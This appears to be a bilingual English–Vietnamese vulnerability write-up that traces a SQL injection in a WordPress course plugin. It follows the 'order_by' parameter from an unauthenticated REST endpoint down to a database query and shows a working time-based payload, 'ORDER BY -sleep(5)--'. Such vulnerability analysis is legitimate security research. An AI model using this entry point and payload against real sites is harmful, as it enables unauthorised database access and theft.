The function is diff at

```php
public static function handle_params_for_query_courses( LP_Course_Filter &$filter, array $param = [] ) {
	...
	
	$filter->order_by = 
	LP_Helper::sanitize_params_submitted 
	(! empty( $param['order_by'] ) ? $param['order_by'] : 'post_date' );
}
```

Which we can trace back from 

trace ngược lại 

```php
public function list_courses( WP_REST_Request $request ): LP_REST_Response {
		$response            = new LP_REST_Response();
		$response->data      = new stdClass();
		$listCoursesTemplate = ListCoursesTemplate::instance();
		$pagination_type     = LP_Settings::get_option( 'course_pagination_type' );

		try {
			$filter = new LP_Course_Filter();
			Courses::handle_params_for_query_courses( $filter, $request->get_params() );
```

Which trace back to rest route

trace sẽ được 

```php

				array(
					'methods'             => WP_REST_Server::ALLMETHODS,
					'callback'            => array( $this, 'list_courses' ),
					'permission_callback' => '__return_true',
					'args'                => [],
				),
			),
```

And called from endpoint

```php
/wordpress/wp-json/lp/v1/courses/archive-course
```

Remember the list course function , it will call to 

hãy nhớ rằng hàm `list_courses,` sẽ gọi đến `LP_Course::get_courses`

```php
public function list_courses( WP_REST_Request $request ): LP_REST_Response {
		$response            = new LP_REST_Response();
		$response->data      = new stdClass();
		$listCoursesTemplate = ListCoursesTemplate::instance();
		$pagination_type     = LP_Settings::get_option( 'course_pagination_type' );

		try {
			$filter = new LP_Course_Filter();
			Courses::handle_params_for_query_courses( $filter, $request->get_params() );

			// Check is in category page.
			if ( ! empty( $request->get_param( 'page_term_id_current' ) ) &&
				empty( $request->get_param( 'term_id' ) ) ) {
				$filter->term_ids[] = $request->get_param( 'page_term_id_current' );
			} // Check is in tag page.
			elseif ( ! empty( $request->get_param( 'page_tag_id_current' ) ) &&
					empty( $request->get_param( 'tag_id' ) ) ) {
				$filter->tag_ids[] = $request->get_param( 'page_tag_id_current' );
			}

			$total_rows = 0;
			$filter     = apply_filters( 'lp/api/courses/filter', $filter, $request );
			// call to get_course
 			$courses     = LP_Course::get_courses( $filter, $total_rows );
```

The get_courses function which will call to get_course function

Hàm  `get_courses` sẽ gọi đến hàm **`get_courses`**

```php
public static function get_courses( LP_Course_Filter $filter, int &$total_rows = 0 ) {
			$lp_course_db = LP_Course_DB::getInstance();
			...
			**$courses = LP_Course_DB::getInstance()->get_courses( $filter, $total_rows );**
```

Which will call to LP_Course_DB method get_courses

Sau khi gọi hàm  **`get_courses`,**  hàm sẽ trả về `execute`

```php
public function get_courses( LP_Course_Filter $filter, int &$total_rows = 0 ) {
		$default_fields = $filter->all_fields;
		$filter->fields = array_merge( $default_fields, $filter->fields );
		
		... 
		return $this->execute( $filter, $total_rows );
```

Call to execute method

Hàm `execcute` sẽ trả về 1 câu truy vấn

```php
public function execute( LP_Filter $filter, int &$total_rows = 0 ) {
		$result = null;
		...
		
		$result = $this->wpdb->get_results( $query );
```

Which we will see a payload as 

sử dụng sleep(5 )  SQLi để chèn payload 

```

SELECT DISTINCT(ID) AS ID FROM wp_posts AS p
		
WHERE 1=1 AND p.post_type = 'lp_course' AND p.post_status IN ('publish')
		
ORDER BY -sleep(5)-- DESC 
LIMIT 0, 10
		
```

⇒ SQL injection
